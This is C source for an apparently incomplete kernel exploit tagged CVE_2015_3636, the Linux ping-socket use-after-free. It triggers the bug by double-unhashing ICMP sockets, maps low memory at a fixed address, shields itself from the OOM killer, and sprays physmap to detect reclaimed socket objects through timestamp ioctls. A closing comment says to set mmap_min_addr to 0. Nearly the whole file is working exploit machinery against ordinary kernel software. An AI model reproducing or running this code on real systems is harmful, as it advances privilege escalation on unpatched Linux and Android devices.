#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <stdint.h>
#include <string.h>
#include <linux/in.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>


#define MAGIC_BASE_ADDR 0x1000
#define MAGIC_ADDR 0x1360
#define MAGIC_NUM(x) 0x0EADBEEF
#define test_num 0x12345678
#define MEM_LEN 0x1000
#define TAG "CVE_2015_3636"
#define true 1
#define false 0
#define SOCK_NUM 900
#define MAP_NUM 0x150
#define MAP_LENTH 0x1000*0x200
#define CHILD_NUM 100
#define OOM_DISABLE -17
#define SIOCGSTAMP 0x8906
#define NSEC_PER_SEC 1000000000
int sock_fd[SOCK_NUM];
void *map_address[MAP_NUM];
int kill_child = 0;

static int
protect_from_oom_killer(void)
{
  int fd;
  char buf[16];
  int ret;

  fd = open("/proc/self/oom_adj", O_WRONLY);
  if (fd == -1) {
    perror("open() in protect_from_oom_killer()");
    return -1;
  }

  sprintf(buf, "%d\n", OOM_DISABLE);

  ret = write(fd, buf, strlen(buf));
  if (ret == -1) {
    perror("write() in protect_from_oom_killer()");
    return -1;
  }

  ret = close(fd);
  if (ret == -1) {
    perror("close() in protect_from_oom_killer()");
    return -1;
  }

  return 0;
}

static int
maximize_fd_limit(void)
{
  struct rlimit rlim;
  int ret;

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  rlim.rlim_cur = rlim.rlim_max;
  setrlimit(RLIMIT_NOFILE, &rlim);

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  return rlim.rlim_cur;
}

static int
lock_page_in_memory(void *address, size_t size)
{
  int ret;

  ret = mlock(address, size);
  if (ret != 0) {
    return -1;
  }

  return 0;
}

static int mapPrepare(){
	void *map;
	map =  mmap((void *)(MAGIC_BASE_ADDR),MEM_LEN,
	PROT_READ | PROT_WRITE,
	MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if(map!=(void *)MAGIC_BASE_ADDR){
		printf("[-]0x1360 failed\n");
		return false;
	}
	printf("[+]map prepare ok map:%p\n",map);
	*(int *)0x1360 = 1;
	return true;
}

static int makeVulSocket(){
	struct sockaddr sa;
	int ret;
	unsigned int i = 0;
	for(i=0;i<SOCK_NUM;i++){
		sock_fd[i] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
		if(sock_fd[i]==-1){
			printf("[%d]socket create failed\n",i);
			break;
		}
	}
	for(i=0;i<SOCK_NUM;i++){
		//hash sk
		memset(&sa,0,sizeof(sa));
		sa.sa_family = AF_INET;
		ret = connect(sock_fd[i],&sa,sizeof(sa));
		//unhash sk
		memset(&sa,0,sizeof(sa));
		sa.sa_family = AF_UNSPEC;
		ret = connect(sock_fd[i],&sa,sizeof(sa));
		ret = connect(sock_fd[i],&sa,sizeof(sa));
	}
	//try to unhash sk
	return true;
}


void fillMapWithTimeMagic(void *address,unsigned int index){
	//memset(address,0x55,MAP_LENTH);
	//return;
	size_t *p;
	unsigned int i,size;
	p = (size_t *)address;
	size = MAP_LENTH/sizeof(size_t);
	for(i=0;i<size;i++,p++){
		*p = (size_t)MAGIC_NUM(index);
	}
	return;
}

void test(){
	struct timespec tv;
  	uint64_t value;
  	uint32_t high, low;
  	int ret;
	size_t buffer[2] = {0,0};
	unsigned int i;
	for(i=0;i<SOCK_NUM;i++){
		if(sock_fd[i] == -1)
			continue;
		ioctl(sock_fd[i],SIOCGSTAMPNS,(void *)&tv);
		value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
  		high = (unsigned)(value >> 32);
  		low = (unsigned)value;
		printf("index[%d]:%p,%p;high:%x\n",i,tv.tv_sec,tv.tv_nsec,high);
		if(high == MAGIC_NUM(1)){
			printf("[+]ok\n");
			sleep(10);
		}
		buffer[1] = 0;
		buffer[0] = 0;
	}
}

static int overridePhysmap(){
	void *map;
	unsigned int i;
	for(i=0;i<MAP_NUM;i++){
		map = mmap(NULL,MAP_LENTH,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_SHARED,-1,0);
		if(map != NULL){
			map_address[i] = map;
			printf("map:%p\n",map);
			lock_page_in_memory(map,MAP_LENTH);
			fillMapWithTimeMagic(map,i);
			test();
		}
		else
			printf("[%d]:mmap failed\n",i);
	}
	return true;
}

// static int
// get_sk_from_timestamp(int sock, unsigned long *paddr)
// {
//   struct timespec tv;
//   uint64_t value;
//   uint32_t high, low;
//   int ret;

//   ret = ioctl(sock, SIOCGSTAMPNS, &tv);
//   if (ret != 0) {
//     return -1;
//   }

//   value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
//   high = (unsigned)(value >> 32);
//   low = (unsigned)value;

//   if (high == TIMESTAMP_MAGIC) {
//     if (paddr)
//       *paddr = low - OFFSET_SK_STAMP;
//     return 1;
//   }

//   return 0;
// }




static int prepareWork(){
	int pid[CHILD_NUM],i;
	printf("%x\n",maximize_fd_limit());
	protect_from_oom_killer();
	for(i=0;i<CHILD_NUM;i++){
		pid[i] = fork();
		if(pid[i] == 0){
			int sock_c_fd[1000];
			int k;
			for(k=0;k<1000;k++)
				sock_c_fd[k] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
			while(!kill_child){
				sleep(1);
			}
			for(k=0;k<1000;k++)
				close(sock_c_fd[k]);
		}else
			continue;
	}
	printf("[+]wait child process create socket\n");
	sleep(20);
	printf("[+]go :%x\n",maximize_fd_limit());
	if(!mapPrepare())
		return -1;
	if(!makeVulSocket())
		return -1;
	kill_child = 1;
	overridePhysmap();
	//close(sock_fd[20]);
	test();
	return 0;
}


int main(){
	int ret;
	prepareWork();
	scanf("%d",&ret);
	return 0;
}

//echo 0 > proc/sys/vm/mmap_min_addr